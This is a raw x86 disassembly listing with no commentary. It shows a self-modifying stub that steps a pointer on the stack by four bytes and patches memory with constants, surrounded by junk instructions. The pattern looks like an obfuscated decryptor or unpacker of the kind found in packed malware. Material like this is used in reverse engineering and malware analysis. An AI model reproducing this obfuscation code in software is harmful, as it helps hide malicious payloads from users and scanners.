  40293b:	33 db                	xor    %ebx,%ebx
  40293d:	b3 04                	mov    $0x4,%bl
  40293f:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402943:	81 db 7a da 40 00    	sbb    $0x40da7a,%ebx
  402949:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  40294d:	81 01 c2 33 c9 b1    	addl   $0xb1c933c2,(%ecx)
  402953:	8d 46 02             	lea    0x2(%esi),%eax
  402956:	33 d2                	xor    %edx,%edx
  402958:	b2 04                	mov    $0x4,%dl
  40295a:	01 54 24 e0          	add    %edx,-0x20(%esp)
  40295e:	8d 40 02             	lea    0x2(%eax),%eax
  402961:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402965:	81 08 04 01 4c 24    	orl    $0x244c0104,(%eax)
  40296b:	66 0b d7             	or     %di,%dx
  40296e:	66 23 f5             	and    %bp,%si
  402971:	33 d2                	xor    %edx,%edx
  402973:	b2 04                	mov    $0x4,%dl
  402975:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402979:	66 23 f5             	and    %bp,%si
  40297c:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402980:	81 03 e0 8b f5 8b    	addl   $0x8bf58be0,(%ebx)
  402986:	66 0b ca             	or     %dx,%cx
  402989:	83 ee 02             	sub    $0x2,%esi
  40298c:	33 d2                	xor    %edx,%edx
  40298e:	b2 04                	mov    $0x4,%dl
  402990:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402994:	83 ee 02             	sub    $0x2,%esi
  402997:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  40299b:	81 0b 4c 24 e0 81    	orl    $0x81e0244c,(%ebx)
  4029a1:	81 e1 7b fe 40 00    	and    $0x40fe7b,%ecx
  4029a7:	33 c9                	xor    %ecx,%ecx
  4029a9:	b1 04                	mov    $0x4,%cl
  4029ab:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  4029af:	c1 e1 02             	shl    $0x2,%ecx
  4029b2:	0f b6 dd             	movzbl %ch,%ebx
  4029b5:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4029b9:	c7 01 01 ee 09 6f    	movl   $0x6f09ee01,(%ecx)
  4029bf:	0f b6 dd             	movzbl %ch,%ebx
  4029c2:	33 d2                	xor    %edx,%edx
  4029c4:	b2 04                	mov    $0x4,%dl
  4029c6:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4029ca:	81 e8 ea de 40 00    	sub    $0x40deea,%eax
  4029d0:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4029d4:	81 01 e9 81 31 65    	addl   $0x653181e9,(%ecx)
  4029da:	c1 ce 02             	ror    $0x2,%esi
  4029dd:	8d 6f 02             	lea    0x2(%edi),%ebp
  4029e0:	33 d2                	xor    %edx,%edx
  4029e2:	b2 04                	mov    $0x4,%dl
  4029e4:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4029e8:	8d 6f 02             	lea    0x2(%edi),%ebp
  4029eb:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  4029ef:	81 0b da e6 eb 97    	orl    $0x97ebe6da,(%ebx)
  4029f5:	83 c0 02             	add    $0x2,%eax
  4029f8:	66 0b eb             	or     %bx,%bp
  4029fb:	33 db                	xor    %ebx,%ebx
  4029fd:	b3 04                	mov    $0x4,%bl
  4029ff:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402a03:	66 0b eb             	or     %bx,%bp
  402a06:	0f be df             	movsbl %bh,%ebx
  402a09:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402a0d:	81 00 0b c2 8d b0    	addl   $0xb08dc20b,(%eax)
  402a13:	0f be df             	movsbl %bh,%ebx
  402a16:	33 db                	xor    %ebx,%ebx
  402a18:	b3 04                	mov    $0x4,%bl
  402a1a:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402a1e:	23 ca                	and    %edx,%ecx
  402a20:	66 2b de             	sub    %si,%bx
  402a23:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  402a27:	b8 ea f8 40 00       	mov    $0x40f8ea,%eax
  402a2c:	ab                   	stos   %eax,%es:(%edi)
  402a2d:	66 2b de             	sub    %si,%bx
  402a30:	33 d2                	xor    %edx,%edx
  402a32:	b2 04                	mov    $0x4,%dl
  402a34:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402a38:	66 85 c7             	test   %ax,%di
  402a3b:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402a3f:	81 01 33 d2 b2 04    	addl   $0x4b2d233,(%ecx)
  402a45:	2b f8                	sub    %eax,%edi
  402a47:	0f be c8             	movsbl %al,%ecx
  402a4a:	33 c0                	xor    %eax,%eax
  402a4c:	b0 04                	mov    $0x4,%al
  402a4e:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402a52:	0f be c8             	movsbl %al,%ecx
  402a55:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  402a59:	b8 01 54 24 e0       	mov    $0xe0245401,%eax
  402a5e:	ab                   	stos   %eax,%es:(%edi)
  402a5f:	2b e9                	sub    %ecx,%ebp
  402a61:	33 d8                	xor    %eax,%ebx
  402a63:	33 c9                	xor    %ecx,%ecx
  402a65:	b1 04                	mov    $0x4,%cl
  402a67:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402a6b:	33 d8                	xor    %eax,%ebx
  402a6d:	66 23 ed             	and    %bp,%bp
  402a70:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402a74:	81 02 0b c2 8b 5c    	addl   $0x5c8bc20b,(%edx)
  402a7a:	66 23 ed             	and    %bp,%bp
  402a7d:	33 c0                	xor    %eax,%eax
  402a7f:	b0 04                	mov    $0x4,%al
  402a81:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402a85:	8b cf                	mov    %edi,%ecx
  402a87:	66 8b fa             	mov    %dx,%di
  402a8a:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402a8e:	c7 03 24 e0 81 03    	movl   $0x381e024,(%ebx)
  402a94:	66 8b fa             	mov    %dx,%di
  402a97:	33 c9                	xor    %ecx,%ecx
  402a99:	b1 04                	mov    $0x4,%cl
  402a9b:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402a9f:	0b d0                	or     %eax,%edx
  402aa1:	0b ce                	or     %esi,%ecx
  402aa3:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402aa7:	81 02 83 c2 04 05    	addl   $0x504c283,(%edx)
  402aad:	0b ce                	or     %esi,%ecx
  402aaf:	81 db 7a da 40 00    	sbb    $0x40da7a,%ebx
  402ab5:	33 db                	xor    %ebx,%ebx
  402ab7:	b3 04                	mov    $0x4,%bl
  402ab9:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402abd:	81 db 7a da 40 00    	sbb    $0x40da7a,%ebx
  402ac3:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402ac7:	81 01 8d b0 ea f8    	addl   $0xf8eab08d,(%ecx)
  402acd:	66 2b ce             	sub    %si,%cx
  402ad0:	33 db                	xor    %ebx,%ebx
  402ad2:	b3 04                	mov    $0x4,%bl
  402ad4:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402ad8:	2b f3                	sub    %ebx,%esi
  402ada:	0f ac e8 03          	shrd   $0x3,%ebp,%eax
  402ade:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402ae2:	81 01 40 00 85 d5    	addl   $0xd5850040,(%ecx)
  402ae8:	0f ac e8 03          	shrd   $0x3,%ebp,%eax
  402aec:	33 d2                	xor    %edx,%edx
  402aee:	b2 04                	mov    $0x4,%dl
  402af0:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402af4:	66 8b cb             	mov    %bx,%cx
  402af7:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402afb:	c7 02 33 c0 b0 04    	movl   $0x4b0c033,(%edx)
  402b01:	66 23 ca             	and    %dx,%cx
  402b04:	c1 e6 02             	shl    $0x2,%esi
  402b07:	85 ef                	test   %ebp,%edi
  402b09:	33 c0                	xor    %eax,%eax
  402b0b:	b0 04                	mov    $0x4,%al
  402b0d:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402b11:	c1 e6 02             	shl    $0x2,%esi
  402b14:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402b18:	c7 03 01 44 24 e0    	movl   $0xe0244401,(%ebx)
  402b1e:	85 ef                	test   %ebp,%edi
  402b20:	33 c9                	xor    %ecx,%ecx
  402b22:	b1 04                	mov    $0x4,%cl
  402b24:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402b28:	23 ee                	and    %esi,%ebp
  402b2a:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402b2e:	81 03 85 d5 c1 cd    	addl   $0xcdc1d585,(%ebx)
  402b34:	23 d6                	and    %esi,%edx
  402b36:	66 0b da             	or     %dx,%bx
  402b39:	33 db                	xor    %ebx,%ebx
  402b3b:	b3 04                	mov    $0x4,%bl
  402b3d:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402b41:	66 0b da             	or     %dx,%bx
  402b44:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402b48:	81 00 02 8b 44 24    	addl   $0x24448b02,(%eax)
  402b4e:	8d b2 7b f9 40 00    	lea    0x40f97b(%edx),%esi
  402b54:	33 d2                	xor    %edx,%edx
  402b56:	b2 04                	mov    $0x4,%dl
  402b58:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402b5c:	66 33 c1             	xor    %cx,%ax
  402b5f:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402b63:	81 02 e0 81 00 38    	addl   $0x380081e0,(%edx)
  402b69:	23 d7                	and    %edi,%edx
  402b6b:	0f be ce             	movsbl %dh,%ecx
  402b6e:	2b f0                	sub    %eax,%esi
  402b70:	33 c0                	xor    %eax,%eax
  402b72:	b0 04                	mov    $0x4,%al
  402b74:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402b78:	0f be ce             	movsbl %dh,%ecx
  402b7b:	2b f0                	sub    %eax,%esi
  402b7d:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402b81:	c7 00 c0 84 18 81    	movl   $0x811884c0,(%eax)
  402b87:	2b f0                	sub    %eax,%esi
  402b89:	81 e0 ff df 40 00    	and    $0x40dfff,%eax
  402b8f:	33 c9                	xor    %ecx,%ecx
  402b91:	b1 04                	mov    $0x4,%cl
  402b93:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402b97:	81 e0 ff df 40 00    	and    $0x40dfff,%eax
  402b9d:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402ba1:	81 0a 30 3c c4 80    	orl    $0x80c43c30,(%edx)
  402ba7:	8d 98 7e f9 40 00    	lea    0x40f97e(%eax),%ebx
  402bad:	33 db                	xor    %ebx,%ebx
  402baf:	b3 04                	mov    $0x4,%bl
  402bb1:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402bb5:	66 23 fa             	and    %dx,%di
  402bb8:	8d 68 02             	lea    0x2(%eax),%ebp
  402bbb:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402bbf:	81 01 1c c1 cd 02    	addl   $0x2cdc11c,(%ecx)
  402bc5:	8d 68 02             	lea    0x2(%eax),%ebp
  402bc8:	0f be cf             	movsbl %bh,%ecx
  402bcb:	8b c5                	mov    %ebp,%eax
  402bcd:	33 c0                	xor    %eax,%eax
  402bcf:	b0 04                	mov    $0x4,%al
  402bd1:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402bd5:	0f be cf             	movsbl %bh,%ecx
  402bd8:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402bdc:	c7 03 8d 88 e9 fb    	movl   $0xfbe9888d,(%ebx)
  402be2:	8b c5                	mov    %ebp,%eax
  402be4:	66 85 ca             	test   %cx,%dx
  402be7:	0f be c2             	movsbl %dl,%eax
  402bea:	33 d2                	xor    %edx,%edx
  402bec:	b2 04                	mov    $0x4,%dl
  402bee:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402bf2:	66 85 ca             	test   %cx,%dx
  402bf5:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402bf9:	81 02 40 00 33 c0    	addl   $0xc0330040,(%edx)
  402bff:	0f be c2             	movsbl %dl,%eax
  402c02:	66 23 ef             	and    %di,%bp
  402c05:	66 8b cf             	mov    %di,%cx
  402c08:	33 c0                	xor    %eax,%eax
  402c0a:	b0 04                	mov    $0x4,%al
  402c0c:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402c10:	66 23 ef             	and    %di,%bp
  402c13:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402c17:	81 01 b0 04 01 44    	addl   $0x440104b0,(%ecx)
  402c1d:	66 8b cf             	mov    %di,%cx
  402c20:	33 c9                	xor    %ecx,%ecx
  402c22:	b1 04                	mov    $0x4,%cl
  402c24:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402c28:	2b c9                	sub    %ecx,%ecx
  402c2a:	8b f3                	mov    %ebx,%esi
  402c2c:	8d b3 fc de 40 00    	lea    0x40defc(%ebx),%esi
  402c32:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402c36:	81 01 24 e0 8d 88    	addl   $0x888de024,(%ecx)
  402c3c:	8b f3                	mov    %ebx,%esi
  402c3e:	8d b3 fc de 40 00    	lea    0x40defc(%ebx),%esi
  402c44:	33 c0                	xor    %eax,%eax
  402c46:	b0 04                	mov    $0x4,%al
  402c48:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402c4c:	8d b3 fc de 40 00    	lea    0x40defc(%ebx),%esi
  402c52:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402c56:	81 01 e9 fb 40 00    	addl   $0x40fbe9,(%ecx)
  402c5c:	23 c8                	and    %eax,%ecx
  402c5e:	23 de                	and    %esi,%ebx
  402c60:	c1 e0 02             	shl    $0x2,%eax
  402c63:	33 c0                	xor    %eax,%eax
  402c65:	b0 04                	mov    $0x4,%al
  402c67:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402c6b:	23 de                	and    %esi,%ebx
  402c6d:	c1 e0 02             	shl    $0x2,%eax
  402c70:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  402c74:	b8 8b 5c 24 e0       	mov    $0xe0245c8b,%eax
  402c79:	ab                   	stos   %eax,%es:(%edi)
  402c7a:	c1 e0 02             	shl    $0x2,%eax
  402c7d:	33 d2                	xor    %edx,%edx
  402c7f:	b2 04                	mov    $0x4,%dl
  402c81:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402c85:	83 ea 02             	sub    $0x2,%edx
  402c88:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402c8c:	81 09 81 03 f9 23    	orl    $0x23f90381,(%ecx)
  402c92:	66 2b c7             	sub    %di,%ax
  402c95:	33 c0                	xor    %eax,%eax
  402c97:	b0 04                	mov    $0x4,%al
  402c99:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402c9d:	83 c0 02             	add    $0x2,%eax
  402ca0:	0b f5                	or     %ebp,%esi
  402ca2:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402ca6:	81 03 69 09 81 33    	addl   $0x33810969,(%ebx)
  402cac:	0b f5                	or     %ebp,%esi
  402cae:	33 c9                	xor    %ecx,%ecx
  402cb0:	b1 04                	mov    $0x4,%cl
  402cb2:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402cb6:	c1 e7 02             	shl    $0x2,%edi
  402cb9:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402cbd:	81 0a 1b d7 3f d8    	orl    $0xd83fd71b,(%edx)
  402cc3:	66 33 f9             	xor    %cx,%di
  402cc6:	33 d2                	xor    %edx,%edx
  402cc8:	b2 04                	mov    $0x4,%dl
  402cca:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402cce:	2b d3                	sub    %ebx,%edx
  402cd0:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402cd4:	81 00 0f be c9 66    	addl   $0x66c9be0f,(%eax)
  402cda:	66 2b c5             	sub    %bp,%ax
  402cdd:	0b c2                	or     %edx,%eax
  402cdf:	66 2b f7             	sub    %di,%si
  402ce2:	33 c9                	xor    %ecx,%ecx
  402ce4:	b1 04                	mov    $0x4,%cl
  402ce6:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402cea:	0b c2                	or     %edx,%eax
  402cec:	66 2b f7             	sub    %di,%si
  402cef:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  402cf3:	b8 03 ee 66 8b       	mov    $0x8b66ee03,%eax
  402cf8:	ab                   	stos   %eax,%es:(%edi)
  402cf9:	66 2b f7             	sub    %di,%si
  402cfc:	66 33 d3             	xor    %bx,%dx
  402cff:	c1 fa 02             	sar    $0x2,%edx
  402d02:	33 d2                	xor    %edx,%edx
  402d04:	b2 04                	mov    $0x4,%dl
  402d06:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402d0a:	66 33 d3             	xor    %bx,%dx
  402d0d:	c1 fa 02             	sar    $0x2,%edx
  402d10:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402d14:	81 02 eb 33 db b3    	addl   $0xb3db33eb,(%edx)
  402d1a:	c1 fa 02             	sar    $0x2,%edx
  402d1d:	66 2b f2             	sub    %dx,%si
  402d20:	33 c0                	xor    %eax,%eax
  402d22:	b0 04                	mov    $0x4,%al
  402d24:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402d28:	66 2b f2             	sub    %dx,%si
  402d2b:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402d2f:	81 08 04 01 5c 24    	orl    $0x245c0104,(%eax)
  402d35:	8d be 6d df 40 00    	lea    0x40df6d(%esi),%edi
  402d3b:	33 c9                	xor    %ecx,%ecx
  402d3d:	b1 04                	mov    $0x4,%cl
  402d3f:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402d43:	c1 d0 02             	rcl    $0x2,%eax
  402d46:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402d4a:	81 02 e0 66 03 ee    	addl   $0xee0366e0,(%edx)
  402d50:	2b dd                	sub    %ebp,%ebx
  402d52:	66 85 d5             	test   %dx,%bp
  402d55:	33 c9                	xor    %ecx,%ecx
  402d57:	b1 04                	mov    $0x4,%cl
  402d59:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402d5d:	66 85 d5             	test   %dx,%bp
  402d60:	03 f6                	add    %esi,%esi
  402d62:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402d66:	c7 00 8b 44 24 e0    	movl   $0xe024448b,(%eax)
  402d6c:	03 f6                	add    %esi,%esi
  402d6e:	66 0b e9             	or     %cx,%bp
  402d71:	33 d7                	xor    %edi,%edx
  402d73:	33 c0                	xor    %eax,%eax
  402d75:	b0 04                	mov    $0x4,%al
  402d77:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402d7b:	66 0b e9             	or     %cx,%bp
  402d7e:	33 d7                	xor    %edi,%edx
  402d80:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402d84:	c7 00 81 00 ee 56    	movl   $0x56ee0081,(%eax)
  402d8a:	33 d7                	xor    %edi,%edx
  402d8c:	66 85 f3             	test   %si,%bx
  402d8f:	85 de                	test   %ebx,%esi
  402d91:	33 c0                	xor    %eax,%eax
  402d93:	b0 04                	mov    $0x4,%al
  402d95:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402d99:	66 85 f3             	test   %si,%bx
  402d9c:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402da0:	81 0a c1 e6 66 8b    	orl    $0x8b66e6c1,(%edx)
  402da6:	85 de                	test   %ebx,%esi
  402da8:	33 c9                	xor    %ecx,%ecx
  402daa:	b1 04                	mov    $0x4,%cl
  402dac:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402db0:	8d 59 02             	lea    0x2(%ecx),%ebx
  402db3:	66 85 f5             	test   %si,%bp
  402db6:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402dba:	81 01 eb 8d 5a 02    	addl   $0x25a8deb,(%ecx)
  402dc0:	66 85 f5             	test   %si,%bp
  402dc3:	33 c0                	xor    %eax,%eax
  402dc5:	b0 04                	mov    $0x4,%al
  402dc7:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402dcb:	66 8b c2             	mov    %dx,%ax
  402dce:	66 2b d1             	sub    %cx,%dx
  402dd1:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402dd5:	81 03 33 db b3 04    	addl   $0x4b3db33,(%ebx)
  402ddb:	66 2b d1             	sub    %cx,%dx
  402dde:	85 d2                	test   %edx,%edx
  402de0:	0f b6 c5             	movzbl %ch,%eax
  402de3:	33 d2                	xor    %edx,%edx
  402de5:	b2 04                	mov    $0x4,%dl
  402de7:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402deb:	85 d2                	test   %edx,%edx
  402ded:	0f b6 c5             	movzbl %ch,%eax
  402df0:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  402df4:	b8 01 5c 24 e0       	mov    $0xe0245c01,%eax
  402df9:	ab                   	stos   %eax,%es:(%edi)
  402dfa:	0f b6 c5             	movzbl %ch,%eax
  402dfd:	03 c8                	add    %eax,%ecx
  402dff:	8d 6e 02             	lea    0x2(%esi),%ebp
  402e02:	33 d2                	xor    %edx,%edx
  402e04:	b2 04                	mov    $0x4,%dl
  402e06:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402e0a:	03 c8                	add    %eax,%ecx
  402e0c:	8d 6e 02             	lea    0x2(%esi),%ebp
  402e0f:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402e13:	81 0a 8d 5a 02 8b    	orl    $0x8b025a8d,(%edx)
  402e19:	8d 6e 02             	lea    0x2(%esi),%ebp
  402e1c:	2b fd                	sub    %ebp,%edi
  402e1e:	8b d2                	mov    %edx,%edx
  402e20:	33 c0                	xor    %eax,%eax
  402e22:	b0 04                	mov    $0x4,%al
  402e24:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402e28:	2b fd                	sub    %ebp,%edi
  402e2a:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402e2e:	81 00 54 24 e0 81    	addl   $0x81e02454,(%eax)
  402e34:	8b d2                	mov    %edx,%edx
  402e36:	8d 57 02             	lea    0x2(%edi),%edx
  402e39:	2b c6                	sub    %esi,%eax
  402e3b:	33 d2                	xor    %edx,%edx
  402e3d:	b2 04                	mov    $0x4,%dl
  402e3f:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402e43:	8d 57 02             	lea    0x2(%edi),%edx
  402e46:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402e4a:	81 00 02 02 56 d1    	addl   $0xd1560202,(%eax)
  402e50:	2b c6                	sub    %esi,%eax
  402e52:	c1 ee 02             	shr    $0x2,%esi
  402e55:	66 0b d2             	or     %dx,%dx
  402e58:	33 c9                	xor    %ecx,%ecx
  402e5a:	b1 04                	mov    $0x4,%cl
  402e5c:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402e60:	c1 ee 02             	shr    $0x2,%esi
  402e63:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402e67:	81 01 e6 03 ee 8b    	addl   $0x8bee03e6,(%ecx)
  402e6d:	66 0b d2             	or     %dx,%dx
  402e70:	33 c0                	xor    %eax,%eax
  402e72:	b0 04                	mov    $0x4,%al
  402e74:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402e78:	8d 71 02             	lea    0x2(%ecx),%esi
  402e7b:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402e7f:	c7 02 fa 33 db b3    	movl   $0xb3db33fa,(%edx)
  402e85:	81 da ed fa 40 00    	sbb    $0x40faed,%edx
  402e8b:	81 c6 fb de 40 00    	add    $0x40defb,%esi
  402e91:	33 d2                	xor    %edx,%edx
  402e93:	b2 04                	mov    $0x4,%dl
  402e95:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402e99:	81 c6 fb de 40 00    	add    $0x40defb,%esi
  402e9f:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402ea3:	81 02 04 01 5c 24    	addl   $0x245c0104,(%edx)
  402ea9:	66 23 ee             	and    %si,%bp
  402eac:	33 db                	xor    %ebx,%ebx
  402eae:	b3 04                	mov    $0x4,%bl
  402eb0:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402eb4:	8b d2                	mov    %edx,%edx
  402eb6:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402eba:	81 02 e0 8b fa 33    	addl   $0x33fa8be0,(%edx)
  402ec0:	33 d7                	xor    %edi,%edx
  402ec2:	f7 e9                	imul   %ecx
  402ec4:	c1 c2 02             	rol    $0x2,%edx
  402ec7:	33 c0                	xor    %eax,%eax
  402ec9:	b0 04                	mov    $0x4,%al
  402ecb:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402ecf:	f7 e9                	imul   %ecx
  402ed1:	c1 c2 02             	rol    $0x2,%edx
  402ed4:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402ed8:	c7 03 ff 8b 4c 24    	movl   $0x244c8bff,(%ebx)
  402ede:	c1 c2 02             	rol    $0x2,%edx
  402ee1:	33 db                	xor    %ebx,%ebx
  402ee3:	b3 04                	mov    $0x4,%bl
  402ee5:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402ee9:	0b cf                	or     %edi,%ecx
  402eeb:	66 03 f0             	add    %ax,%si
  402eee:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402ef2:	81 00 e0 81 01 73    	addl   $0x730181e0,(%eax)
  402ef8:	66 03 f0             	add    %ax,%si
  402efb:	33 c0                	xor    %eax,%eax
  402efd:	b0 04                	mov    $0x4,%al
  402eff:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402f03:	85 df                	test   %ebx,%edi
  402f05:	8b c7                	mov    %edi,%eax
  402f07:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402f0b:	81 00 15 a3 63 81    	addl   $0x8163a315,(%eax)
  402f11:	8b c7                	mov    %edi,%eax
  402f13:	23 df                	and    %edi,%ebx
  402f15:	8d 4d 02             	lea    0x2(%ebp),%ecx
  402f18:	f7 d9                	neg    %ecx
  402f1a:	33 d2                	xor    %edx,%edx
  402f1c:	b2 04                	mov    $0x4,%dl
  402f1e:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402f22:	23 df                	and    %edi,%ebx
  402f24:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402f28:	c7 00 31 25 26 55    	movl   $0x55262531,(%eax)
  402f2e:	8d 4d 02             	lea    0x2(%ebp),%ecx
  402f31:	33 c0                	xor    %eax,%eax
  402f33:	b0 04                	mov    $0x4,%al
  402f35:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402f39:	f7 d9                	neg    %ecx
  402f3b:	2b fd                	sub    %ebp,%edi
  402f3d:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402f41:	81 03 50 33 ff 03    	addl   $0x3ff3350,(%ebx)
  402f47:	2b fd                	sub    %ebp,%edi
  402f49:	66 2b de             	sub    %si,%bx
  402f4c:	c1 e5 02             	shl    $0x2,%ebp
  402f4f:	33 c0                	xor    %eax,%eax
  402f51:	b0 04                	mov    $0x4,%al
  402f53:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402f57:	66 2b de             	sub    %si,%bx
  402f5a:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402f5e:	81 02 c2 66 33 fb    	addl   $0xfb3366c2,(%edx)
  402f64:	c1 e5 02             	shl    $0x2,%ebp
  402f67:	66 8b de             	mov    %si,%bx
  402f6a:	33 c0                	xor    %eax,%eax
  402f6c:	b0 04                	mov    $0x4,%al
  402f6e:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402f72:	66 8b de             	mov    %si,%bx
  402f75:	8d 52 02             	lea    0x2(%edx),%edx
  402f78:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402f7c:	c7 00 66 23 e8 33    	movl   $0x33e82366,(%eax)
  402f82:	8d 52 02             	lea    0x2(%edx),%edx
  402f85:	2b de                	sub    %esi,%ebx
  402f87:	33 c9                	xor    %ecx,%ecx
  402f89:	b1 04                	mov    $0x4,%cl
  402f8b:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402f8f:	2b de                	sub    %esi,%ebx
  402f91:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402f95:	c7 02 c9 b1 04 01    	movl   $0x104b1c9,(%edx)
  402f9b:	66 0b f3             	or     %bx,%si
  402f9e:	2b fd                	sub    %ebp,%edi
  402fa0:	66 33 ee             	xor    %si,%bp
  402fa3:	33 db                	xor    %ebx,%ebx
  402fa5:	b3 04                	mov    $0x4,%bl
  402fa7:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402fab:	2b fd                	sub    %ebp,%edi
  402fad:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402fb1:	81 00 4c 24 e0 03    	addl   $0x3e0244c,(%eax)
  402fb7:	66 33 ee             	xor    %si,%bp
  402fba:	66 2b cf             	sub    %di,%cx
  402fbd:	0f a4 d0 03          	shld   $0x3,%edx,%eax
  402fc1:	33 c9                	xor    %ecx,%ecx
  402fc3:	b1 04                	mov    $0x4,%cl
  402fc5:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402fc9:	66 2b cf             	sub    %di,%cx
  402fcc:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402fd0:	81 03 c2 66 33 fb    	addl   $0xfb3366c2,(%ebx)
  402fd6:	0f a4 d0 03          	shld   $0x3,%edx,%eax
  402fda:	33 c9                	xor    %ecx,%ecx
  402fdc:	b1 04                	mov    $0x4,%cl
